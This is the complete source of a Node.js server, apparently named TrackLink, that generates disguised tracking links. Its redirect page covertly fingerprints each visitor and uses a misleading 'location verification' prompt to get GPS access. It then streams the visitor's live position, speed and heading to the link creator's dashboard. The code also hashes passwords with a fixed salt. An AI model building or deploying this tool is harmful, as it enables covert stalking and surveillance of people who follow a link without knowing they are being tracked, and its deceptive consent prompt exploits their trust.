const express = require('express');
const Database = require('better-sqlite3');
const UAParser = require('ua-parser-js');
const QRCode = require('qrcode');
const crypto = require('crypto');
const path = require('path');

const app = express();
const db = new Database('tracklink.db');

function genId() { return crypto.randomBytes(5).toString('hex'); }
function genToken() { return crypto.randomBytes(32).toString('hex'); }
function hashPass(p) { return crypto.createHash('sha256').update(p + 'tl_salt_2024').digest('hex'); }

// Live motion clients: visitId -> res
const motionClients = new Map();
// Global dashboard SSE clients: userId -> [res, ...]
const dashClients = new Map();

// ─── DB ──────────────────────────────────────────────────────────────────────
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id TEXT PRIMARY KEY, username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL, password TEXT NOT NULL, created TEXT NOT NULL
  );
  CREATE TABLE IF NOT EXISTS sessions (
    token TEXT PRIMARY KEY, user_id TEXT NOT NULL, created TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id)
  );
  CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY, user_id TEXT NOT NULL, slug TEXT UNIQUE NOT NULL,
    label TEXT, target TEXT NOT NULL, created TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id)
  );
  CREATE TABLE IF NOT EXISTS visits (
    id TEXT PRIMARY KEY, link_id TEXT NOT NULL,
    ip TEXT, ip_type TEXT,
    country TEXT, country_code TEXT, city TEXT, region TEXT, zip TEXT,
    lat REAL, lon REAL,
    gps_lat REAL, gps_lon REAL, gps_accuracy REAL, gps_address TEXT,
    live_lat REAL, live_lon REAL, live_updated TEXT,
    timezone TEXT, isp TEXT, org TEXT, as_number TEXT,
    is_proxy INTEGER DEFAULT 0, is_vpn INTEGER DEFAULT 0, is_mobile INTEGER DEFAULT 0,
    browser TEXT, browser_ver TEXT, browser_engine TEXT,
    os TEXT, os_ver TEXT, device TEXT, device_brand TEXT, device_model TEXT, cpu_arch TEXT,
    referrer TEXT, referrer_domain TEXT, ua TEXT,
    language TEXT, screen TEXT, color_depth TEXT, timezone_client TEXT, platform TEXT,
    connection_type TEXT, connection_speed TEXT, battery_level TEXT, battery_charging TEXT,
    memory_gb TEXT, cpu_cores TEXT, touch_points TEXT,
    webgl_vendor TEXT, webgl_renderer TEXT,
    canvas_fp TEXT, plugins TEXT, do_not_track TEXT,
    time TEXT NOT NULL,
    FOREIGN KEY(link_id) REFERENCES links(id)
  );
  CREATE TABLE IF NOT EXISTS motion_log (
    id TEXT PRIMARY KEY, visit_id TEXT NOT NULL,
    lat REAL, lon REAL, accuracy REAL,
    altitude REAL, altitude_accuracy REAL,
    speed REAL, heading REAL,
    time TEXT NOT NULL,
    FOREIGN KEY(visit_id) REFERENCES visits(id)
  );
`);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function requireAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  const session = db.prepare('SELECT s.*, u.username, u.id as uid FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.token=?').get(token);
  if (!session) return res.status(401).json({ error: 'Invalid session' });
  req.user = { id: session.uid, username: session.username };
  next();
}

function getIP(req) {
  return (req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] ||
    (req.headers['x-forwarded-for']||'').split(',')[0].trim() ||
    req.socket.remoteAddress || '0.0.0.0').replace('::ffff:','');
}

async function geoLocate(ip) {
  const isPrivate = ['127.0.0.1','::1','0.0.0.0'].includes(ip) ||
    ip.startsWith('192.168.')||ip.startsWith('10.')||ip.startsWith('172.16.');
  if (isPrivate) return { country:'Local',country_code:'LO',city:'Localhost',region:'',zip:'',lat:0,lon:0,timezone:'Local',isp:'Local',org:'',as_number:'',is_proxy:0,is_mobile:0,ip_type:'private' };
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,mobile,hosting`);
    const d = await r.json();
    if (d.status==='success') return {
      country:d.country, country_code:d.countryCode, city:d.city, region:d.regionName,
      zip:d.zip, lat:d.lat, lon:d.lon, timezone:d.timezone, isp:d.isp, org:d.org,
      as_number:d.as, is_proxy:d.proxy?1:0, is_vpn:d.proxy?1:0, is_mobile:d.mobile?1:0,
      ip_type:d.hosting?'hosting':'residential'
    };
  } catch(_) {}
  return { country:'Unknown',country_code:'??',city:'Unknown',region:'',zip:'',lat:0,lon:0,timezone:'',isp:'',org:'',as_number:'',is_proxy:0,is_mobile:0,ip_type:'unknown' };
}

function parseUA(ua) {
  const r = new UAParser(ua).getResult();
  return {
    browser:r.browser.name||'Unknown', browser_ver:r.browser.major||'',
    browser_engine:r.engine.name||'', os:r.os.name||'Unknown', os_ver:r.os.version||'',
    device:r.device.type||'desktop', device_brand:r.device.vendor||'',
    device_model:r.device.model||'', cpu_arch:r.cpu.architecture||''
  };
}
function refDomain(ref) {
  if (!ref||ref==='Direct') return 'Direct';
  try { return new URL(ref).hostname; } catch { return ref; }
}

// ─── AUTH ─────────────────────────────────────────────────────────────────────
app.post('/api/register', (req, res) => {
  const { username, email, password } = req.body;
  if (!username||!email||!password) return res.status(400).json({ error:'All fields required' });
  if (password.length<6) return res.status(400).json({ error:'Password min 6 chars' });
  const id = genId();
  try {
    db.prepare('INSERT INTO users (id,username,email,password,created) VALUES (?,?,?,?,?)')
      .run(id, username.trim().toLowerCase(), email.trim().toLowerCase(), hashPass(password), new Date().toISOString());
    const token = genToken();
    db.prepare('INSERT INTO sessions (token,user_id,created) VALUES (?,?,?)').run(token, id, new Date().toISOString());
    res.json({ token, username: username.trim().toLowerCase() });
  } catch(e) {
    if (e.message.includes('UNIQUE')) {
      if (e.message.includes('username')) return res.status(409).json({ error:'Username taken' });
      if (e.message.includes('email')) return res.status(409).json({ error:'Email already registered' });
    }
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (!username||!password) return res.status(400).json({ error:'All fields required' });
  const user = db.prepare('SELECT * FROM users WHERE username=? OR email=?').get(username.trim().toLowerCase(), username.trim().toLowerCase());
  if (!user||user.password!==hashPass(password)) return res.status(401).json({ error:'Invalid username or password' });
  const token = genToken();
  db.prepare('INSERT INTO sessions (token,user_id,created) VALUES (?,?,?)').run(token, user.id, new Date().toISOString());
  res.json({ token, username: user.username });
});

app.post('/api/logout', (req, res) => {
  const token = req.headers['x-auth-token'];
  if (token) db.prepare('DELETE FROM sessions WHERE token=?').run(token);
  res.json({ ok:true });
});

app.get('/api/me', requireAuth, (req, res) => res.json({ username:req.user.username, id:req.user.id }));

// ─── LINKS ───────────────────────────────────────────────────────────────────
app.post('/api/links', requireAuth, (req, res) => {
  const { target, label, slug:cs } = req.body;
  if (!target) return res.status(400).json({ error:'Target URL required' });
  try { new URL(target); } catch { return res.status(400).json({ error:'Invalid URL' }); }
  const slug = cs?.trim().replace(/\s+/g,'-').toLowerCase() || genId();
  const id = genId();
  try {
    db.prepare('INSERT INTO links (id,user_id,slug,label,target,created) VALUES (?,?,?,?,?,?)')
      .run(id, req.user.id, slug, label||target, target, new Date().toISOString());
    res.json({ id, slug, label:label||target, target });
  } catch(e) {
    if (e.message.includes('UNIQUE')) return res.status(409).json({ error:'Slug taken' });
    res.status(500).json({ error:e.message });
  }
});

app.get('/api/links', requireAuth, (req, res) => {
  res.json(db.prepare('SELECT l.*,COUNT(v.id) as clicks FROM links l LEFT JOIN visits v ON v.link_id=l.id WHERE l.user_id=? GROUP BY l.id ORDER BY l.created DESC').all(req.user.id));
});

app.delete('/api/links/:id', requireAuth, (req, res) => {
  const link = db.prepare('SELECT * FROM links WHERE id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!link) return res.status(404).json({ error:'Not found' });
  db.prepare('DELETE FROM motion_log WHERE visit_id IN (SELECT id FROM visits WHERE link_id=?)').run(req.params.id);
  db.prepare('DELETE FROM visits WHERE link_id=?').run(req.params.id);
  db.prepare('DELETE FROM links WHERE id=?').run(req.params.id);
  res.json({ ok:true });
});

// ─── VISITS ──────────────────────────────────────────────────────────────────
app.get('/api/visits', requireAuth, (req, res) => {
  const { link_id } = req.query;
  const q = link_id
    ? 'SELECT v.*,l.label as link_label,l.slug as link_slug FROM visits v JOIN links l ON l.id=v.link_id WHERE v.link_id=? AND l.user_id=? ORDER BY v.time DESC LIMIT 500'
    : 'SELECT v.*,l.label as link_label,l.slug as link_slug FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? ORDER BY v.time DESC LIMIT 500';
  res.json(link_id ? db.prepare(q).all(link_id, req.user.id) : db.prepare(q).all(req.user.id));
});

app.delete('/api/visits/:id', requireAuth, (req, res) => {
  const visit = db.prepare('SELECT v.* FROM visits v JOIN links l ON l.id=v.link_id WHERE v.id=? AND l.user_id=?').get(req.params.id, req.user.id);
  if (!visit) return res.status(404).json({ error:'Not found' });
  db.prepare('DELETE FROM motion_log WHERE visit_id=?').run(req.params.id);
  db.prepare('DELETE FROM visits WHERE id=?').run(req.params.id);
  res.json({ ok:true });
});

app.delete('/api/visits', requireAuth, (req, res) => {
  const { link_id } = req.query;
  const links = link_id
    ? [db.prepare('SELECT * FROM links WHERE id=? AND user_id=?').get(link_id, req.user.id)].filter(Boolean)
    : db.prepare('SELECT id FROM links WHERE user_id=?').all(req.user.id);
  links.forEach(l => {
    db.prepare('DELETE FROM motion_log WHERE visit_id IN (SELECT id FROM visits WHERE link_id=?)').run(l.id);
    db.prepare('DELETE FROM visits WHERE link_id=?').run(l.id);
  });
  res.json({ ok:true });
});

// Motion log for a visit
app.get('/api/motion/:visitId', requireAuth, (req, res) => {
  const visit = db.prepare('SELECT v.* FROM visits v JOIN links l ON l.id=v.link_id WHERE v.id=? AND l.user_id=?').get(req.params.visitId, req.user.id);
  if (!visit) return res.status(404).json({ error:'Not found' });
  const log = db.prepare('SELECT * FROM motion_log WHERE visit_id=? ORDER BY time ASC').all(req.params.visitId);
  res.json(log);
});

// ─── STATS ───────────────────────────────────────────────────────────────────
app.get('/api/stats', requireAuth, (req, res) => {
  const uid = req.user.id;
  const today = new Date().toISOString().split('T')[0];
  res.json({
    total_clicks: db.prepare('SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=?').get(uid).c,
    unique_ips:   db.prepare('SELECT COUNT(DISTINCT v.ip) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=?').get(uid).c,
    total_links:  db.prepare('SELECT COUNT(*) as c FROM links WHERE user_id=?').get(uid).c,
    today_clicks: db.prepare("SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.time LIKE ?").get(uid, today+'%').c,
    proxy_count:  db.prepare('SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.is_proxy=1').get(uid).c,
    gps_count:    db.prepare('SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.gps_lat IS NOT NULL AND v.gps_lat!=0').get(uid).c,
    top_countries:db.prepare('SELECT v.country,v.country_code,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? GROUP BY v.country ORDER BY count DESC LIMIT 8').all(uid),
    top_browsers: db.prepare('SELECT v.browser,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? GROUP BY v.browser ORDER BY count DESC LIMIT 6').all(uid),
    devices:      db.prepare('SELECT v.device,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? GROUP BY v.device ORDER BY count DESC').all(uid),
    top_isps:     db.prepare("SELECT v.isp,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.isp!='' GROUP BY v.isp ORDER BY count DESC LIMIT 5").all(uid),
    map_points:   db.prepare('SELECT v.id,v.lat,v.lon,v.gps_lat,v.gps_lon,v.live_lat,v.live_lon,v.city,v.country,v.country_code,v.ip,v.time,v.device,v.browser,v.gps_address,v.gps_accuracy FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND (v.lat!=0 OR (v.gps_lat IS NOT NULL AND v.gps_lat!=0)) ORDER BY v.time DESC LIMIT 300').all(uid),
    live_visitors:db.prepare("SELECT v.id,v.ip,v.country,v.country_code,v.city,v.live_lat,v.live_lon,v.live_updated,v.gps_lat,v.gps_lon,v.browser,v.device FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.live_updated IS NOT NULL ORDER BY v.live_updated DESC LIMIT 50").all(uid),
  });
});

app.get('/api/qr', requireAuth, async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).send('url required');
  try {
    const dataUrl = await QRCode.toDataURL(url, { width:300, margin:2, color:{dark:'#00e5ff',light:'#0a0a0f'} });
    res.json({ qr: dataUrl });
  } catch(e) { res.status(500).json({ error:e.message }); }
});

// ─── ENRICH (initial data) ────────────────────────────────────────────────────
app.post('/api/enrich/:visitId', (req, res) => {
  const d = req.body;
  db.prepare(`UPDATE visits SET
    language=?,screen=?,color_depth=?,timezone_client=?,platform=?,
    gps_lat=?,gps_lon=?,gps_accuracy=?,gps_address=?,
    connection_type=?,connection_speed=?,battery_level=?,battery_charging=?,
    memory_gb=?,cpu_cores=?,touch_points=?,webgl_vendor=?,webgl_renderer=?,
    canvas_fp=?,plugins=?,do_not_track=?
    WHERE id=?`)
    .run(
      d.language||'', d.screen||'', d.colorDepth||'', d.timezone||'', d.platform||'',
      d.gps_lat||null, d.gps_lon||null, d.gps_accuracy||null, d.gps_address||'',
      d.connection_type||'', d.connection_speed||'', d.battery_level||'', d.battery_charging||'',
      d.memory_gb||'', d.cpu_cores||'', d.touch_points||'',
      d.webgl_vendor||'', d.webgl_renderer||'',
      d.canvas_fp||'', d.plugins||'', d.do_not_track||'',
      req.params.visitId
    );

  // If GPS was captured, alert dashboard
  if (d.gps_lat) {
    notifyDashboard(req.params.visitId, 'gps_captured', {
      visitId: req.params.visitId,
      gps_lat: d.gps_lat,
      gps_lon: d.gps_lon,
      gps_accuracy: d.gps_accuracy,
      gps_address: d.gps_address
    });
  }

  res.json({ ok:true });
});

// ─── LIVE MOTION UPDATE (from visitor's browser) ──────────────────────────────
app.post('/api/motion/:visitId', (req, res) => {
  const { lat, lon, accuracy, altitude, altitude_accuracy, speed, heading } = req.body;
  if (!lat||!lon) return res.status(400).json({ error:'lat/lon required' });

  const now = new Date().toISOString();
  // Update live position on visit
  db.prepare('UPDATE visits SET live_lat=?,live_lon=?,live_updated=? WHERE id=?').run(lat, lon, now, req.params.visitId);
  // Log to motion trail with full data
  db.prepare('INSERT INTO motion_log (id,visit_id,lat,lon,accuracy,altitude,altitude_accuracy,speed,heading,time) VALUES (?,?,?,?,?,?,?,?,?,?)')
    .run(genId(), req.params.visitId, lat, lon, accuracy||0, altitude||null, altitude_accuracy||null, speed||null, heading||null, now);

  // Push to any SSE listeners for this visit
  const clients = motionClients.get(req.params.visitId) || [];
  const data = JSON.stringify({ lat, lon, accuracy, altitude, speed, heading, time:now });
  clients.forEach(client => {
    try { client.write(`data: ${data}\n\n`); } catch(_) {}
  });

  // Notify dashboard owner of live GPS update
  notifyDashboard(req.params.visitId, 'gps_update', { visitId: req.params.visitId, lat, lon, accuracy, altitude, speed, heading, time: now });

  res.json({ ok:true });
});

// ─── SSE: global dashboard feed (GPS alerts, new visits) ─────────────────────
app.get('/api/live-feed', requireAuth, (req, res) => {
  res.setHeader('Content-Type','text/event-stream');
  res.setHeader('Cache-Control','no-cache');
  res.setHeader('Connection','keep-alive');
  res.flushHeaders();

  const uid = req.user.id;
  if (!dashClients.has(uid)) dashClients.set(uid, []);
  dashClients.get(uid).push(res);

  // Heartbeat every 25s to keep connection alive
  const hb = setInterval(() => { try { res.write(': ping\n\n'); } catch(_) {} }, 25000);

  req.on('close', () => {
    clearInterval(hb);
    const list = dashClients.get(uid) || [];
    dashClients.set(uid, list.filter(c => c !== res));
  });
});

// Helper: push event to dashboard clients who own a visit
function notifyDashboard(visitId, event, payload) {
  try {
    const link = db.prepare('SELECT l.user_id FROM visits v JOIN links l ON l.id=v.link_id WHERE v.id=?').get(visitId);
    if (!link) return;
    const clients = dashClients.get(link.user_id) || [];
    const msg = `event: ${event}\ndata: ${JSON.stringify(payload)}\n\n`;
    clients.forEach(c => { try { c.write(msg); } catch(_) {} });
  } catch(_) {}
}

// ─── SSE: live motion stream ──────────────────────────────────────────────────
app.get('/api/motion-stream/:visitId', requireAuth, (req, res) => {
  res.setHeader('Content-Type','text/event-stream');
  res.setHeader('Cache-Control','no-cache');
  res.setHeader('Connection','keep-alive');
  res.flushHeaders();

  const visitId = req.params.visitId;
  if (!motionClients.has(visitId)) motionClients.set(visitId, []);
  motionClients.get(visitId).push(res);

  // Send current position immediately
  const visit = db.prepare('SELECT live_lat,live_lon,live_updated FROM visits WHERE id=?').get(visitId);
  if (visit?.live_lat) {
    res.write(`data: ${JSON.stringify({ lat:visit.live_lat, lon:visit.live_lon, time:visit.live_updated })}\n\n`);
  }

  req.on('close', () => {
    const list = motionClients.get(visitId) || [];
    motionClients.set(visitId, list.filter(c => c !== res));
  });
});

// ─── TRACKER PAGE ─────────────────────────────────────────────────────────────
app.get('/t/:slug', async (req, res) => {
  const link = db.prepare('SELECT * FROM links WHERE slug=?').get(req.params.slug);
  if (!link) return res.status(404).send('Link not found.');

  const visitId = genId();
  const ip = getIP(req);
  const ua = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || 'Direct';
  const parsed = parseUA(ua);

  db.prepare('INSERT INTO visits (id,link_id,ip,browser,browser_ver,browser_engine,os,os_ver,device,device_brand,device_model,cpu_arch,referrer,referrer_domain,ua,time) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)')
    .run(visitId, link.id, ip, parsed.browser, parsed.browser_ver, parsed.browser_engine,
      parsed.os, parsed.os_ver, parsed.device, parsed.device_brand, parsed.device_model,
      parsed.cpu_arch, referrer, refDomain(referrer), ua, new Date().toISOString());

  const target = link.target.replace(/\\/g,'\\\\').replace(/`/g,'\\`').replace(/\$/g,'\\$');

  res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Please wait...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#080810;color:#e8e8f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.wrap{text-align:center;padding:24px 20px;max-width:320px;width:100%;}
.sp{width:44px;height:44px;border:3px solid #1c1c2e;border-top-color:#00e5ff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;}
@keyframes spin{to{transform:rotate(360deg)}}
.status{font-size:13px;color:#5a5a72;margin-top:10px;}
/* GPS prompt card */
#gps-card{display:none;background:#0f0f1a;border:1px solid rgba(0,230,118,.3);border-radius:16px;padding:24px 20px;text-align:center;animation:fadeIn .3s ease;}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.gps-icon{font-size:40px;margin-bottom:12px;}
.gps-title{font-size:16px;font-weight:600;margin-bottom:6px;}
.gps-sub{font-size:12px;color:#5a5a72;margin-bottom:18px;line-height:1.6;}
.gps-allow{display:block;width:100%;padding:13px;background:linear-gradient(135deg,#00c853,#00e676);color:#000;font-size:14px;font-weight:700;border:none;border-radius:10px;cursor:pointer;margin-bottom:9px;}
.gps-skip{display:block;width:100%;padding:10px;background:none;color:#5a5a72;font-size:13px;border:1px solid #1c1c2e;border-radius:10px;cursor:pointer;}
</style>
</head>
<body>
<div class="wrap">
  <!-- default spinner -->
  <div id="spinner-view">
    <div class="sp"></div>
    <div class="status" id="status-msg">Preparing redirect...</div>
  </div>
  <!-- GPS prompt shown before redirect -->
  <div id="gps-card">
    <div class="gps-icon">📍</div>
    <div class="gps-title">Allow Location Access?</div>
    <div class="gps-sub">This link uses location verification.<br>Tap Allow to continue to the destination.</div>
    <button class="gps-allow" id="btn-allow">Allow & Continue →</button>
    <button class="gps-skip" id="btn-skip">Skip</button>
  </div>
</div>
<script>
const VID='${visitId}';
const TARGET='${target}';

function setStatus(msg){ const el=document.getElementById('status-msg'); if(el) el.textContent=msg; }

async function reverseGeocode(lat, lon) {
  try {
    const r = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lon+'&zoom=18&addressdetails=1',{headers:{'Accept-Language':'en'}});
    const d = await r.json();
    return d.display_name || '';
  } catch(_) { return ''; }
}

async function collectAll(gpsData) {
  const data = {
    language: navigator.language || navigator.userLanguage || '',
    screen: screen.width + 'x' + screen.height,
    colorDepth: String(screen.colorDepth || ''),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
    platform: navigator.platform || (navigator.userAgentData?.platform) || '',
    do_not_track: navigator.doNotTrack || window.doNotTrack || '',
    touch_points: String(navigator.maxTouchPoints || 0),
    cpu_cores: String(navigator.hardwareConcurrency || ''),
    memory_gb: String(navigator.deviceMemory || ''),
    ...gpsData
  };
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn) { data.connection_type = conn.effectiveType || conn.type || ''; data.connection_speed = String(conn.downlink || ''); }
  try {
    const bat = await navigator.getBattery?.();
    if (bat) { data.battery_level = String(Math.round(bat.level*100))+'%'; data.battery_charging = bat.charging?'Charging':'Not charging'; }
  } catch(_) {}
  try {
    const cv = document.createElement('canvas');
    const gl = cv.getContext('webgl')||cv.getContext('experimental-webgl');
    if (gl) { const ext=gl.getExtension('WEBGL_debug_renderer_info'); if(ext){ data.webgl_vendor=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)||''; data.webgl_renderer=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)||''; } }
  } catch(_) {}
  try {
    const c=document.createElement('canvas'); c.width=200; c.height=50;
    const ctx=c.getContext('2d'); ctx.textBaseline='top'; ctx.font='14px Arial';
    ctx.fillStyle='#f00'; ctx.fillRect(0,0,200,50); ctx.fillStyle='rgba(0,255,0,.5)'; ctx.fillText('TrackLink FP',2,2);
    const hash=c.toDataURL().split('').reduce((a,b)=>(((a<<5)-a)+b.charCodeAt(0))|0,0);
    data.canvas_fp=String(Math.abs(hash));
  } catch(_) {}
  try { data.plugins=Array.from(navigator.plugins||[]).map(p=>p.name).slice(0,5).join(', '); } catch(_) {}
  return data;
}

async function sendData(data) {
  try { await fetch('/api/enrich/'+VID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}); } catch(_) {}
}

// Sends ONE motion update with full coords + altitude + speed + heading
async function sendMotion(pos) {
  const c = pos.coords;
  try {
    await fetch('/api/motion/'+VID,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        lat: c.latitude,
        lon: c.longitude,
        accuracy: c.accuracy,
        altitude: c.altitude,
        altitude_accuracy: c.altitudeAccuracy,
        speed: c.speed,
        heading: c.heading
      })
    });
  } catch(_) {}
}

// Continuously watches position and streams to server
let watchId = null;
function startMotionTracking() {
  if (!navigator.geolocation) return;
  watchId = navigator.geolocation.watchPosition(
    async (pos) => { await sendMotion(pos); },
    null,
    { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
  );
}

// Gets GPS position with full coordinate data
async function getGPS(highAccuracy, timeout, maxAge) {
  return new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      p => resolve(p),
      () => resolve(null),
      { enableHighAccuracy: highAccuracy, timeout, maximumAge: maxAge }
    );
  });
}

async function doGPS() {
  if (!navigator.geolocation) return {};
  setStatus('Getting your location...');
  let pos = await getGPS(true, 10000, 0);
  if (!pos) pos = await getGPS(false, 5000, 60000);
  if (!pos) return {};
  const c = pos.coords;
  const gps_address = await reverseGeocode(c.latitude, c.longitude);
  // Also send initial motion point with rich data
  await sendMotion(pos);
  // Then watch continuously
  startMotionTracking();
  return {
    gps_lat: c.latitude,
    gps_lon: c.longitude,
    gps_accuracy: c.accuracy,
    gps_address
  };
}

async function proceedWithGPS() {
  document.getElementById('gps-card').style.display='none';
  document.getElementById('spinner-view').style.display='block';
  const gpsData = await doGPS();
  const data = await collectAll(gpsData);
  await sendData(data);
  window.location.replace(TARGET);
}

async function proceedWithoutGPS() {
  document.getElementById('gps-card').style.display='none';
  document.getElementById('spinner-view').style.display='block';
  setStatus('Redirecting...');
  const data = await collectAll({});
  await sendData(data);
  window.location.replace(TARGET);
}

async function run() {
  // Check if geolocation is available
  if (!navigator.geolocation) {
    // No GPS support — just collect and redirect
    const data = await collectAll({});
    await sendData(data);
    window.location.replace(TARGET);
    return;
  }

  // Check current permission state if API available
  if (navigator.permissions) {
    try {
      const perm = await navigator.permissions.query({ name: 'geolocation' });
      if (perm.state === 'granted') {
        // Already allowed — silently get GPS and go
        await proceedWithGPS();
        return;
      } else if (perm.state === 'denied') {
        // Blocked — skip GPS entirely
        await proceedWithoutGPS();
        return;
      }
    } catch(_) {}
  }

  // Permission is 'prompt' — show our custom card first
  document.getElementById('spinner-view').style.display='none';
  document.getElementById('gps-card').style.display='block';
  document.getElementById('btn-allow').onclick = () => proceedWithGPS();
  document.getElementById('btn-skip').onclick = () => proceedWithoutGPS();
}

run();
</script>
</body>
</html>`);

  // IP geo in background
  geoLocate(ip).then(geo => {
    db.prepare('UPDATE visits SET country=?,country_code=?,city=?,region=?,zip=?,lat=?,lon=?,timezone=?,isp=?,org=?,as_number=?,is_proxy=?,is_vpn=?,is_mobile=?,ip_type=? WHERE id=?')
      .run(geo.country,geo.country_code,geo.city,geo.region,geo.zip,geo.lat,geo.lon,geo.timezone,geo.isp,geo.org,geo.as_number,geo.is_proxy,geo.is_vpn||0,geo.is_mobile,geo.ip_type||'',visitId);
  });
});

app.use(express.static(path.join(__dirname,'public')));
app.get('*',(req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

const PORT = process.env.PORT||3000;
app.listen(PORT,()=>console.log(`\n  🔗 TrackLink → http://localhost:${PORT}\n`));
